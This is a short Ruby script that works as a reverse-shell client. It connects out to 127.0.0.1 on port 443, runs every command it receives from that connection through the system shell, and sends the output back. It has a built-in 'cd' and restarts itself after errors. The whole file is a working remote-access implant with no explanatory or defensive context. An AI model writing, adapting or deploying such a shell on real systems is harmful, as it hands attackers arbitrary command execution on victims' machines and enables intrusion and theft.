require 'socket'
require 'open3'
require 'shellwords'
def command_loop(s)
  loop {
    command = s.recv(1024)
    command = command.chomp
    exit if command == 'exit'
    shell_command, *arguments = Shellwords.shellsplit(command)
    if BUILTINS[shell_command]
      BUILTINS[shell_command].call(*arguments)
      s.print(Dir.pwd)
    else
      stdin, stdout_and_stderr = Open3.popen2e("#{command}")
      s.print("#{stdout_and_stderr.readlines.join.chomp}\0")
    end
  }
  rescue
    @s.puts("command does not exist\0")
    command_loop(@s) 
end
def connect_to_host()
  hostname = '127.0.0.1'
  port = 443
  @s = TCPSocket.open(hostname, port)
  command_loop(@s)
end
begin
  BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
  connect_to_host()
end
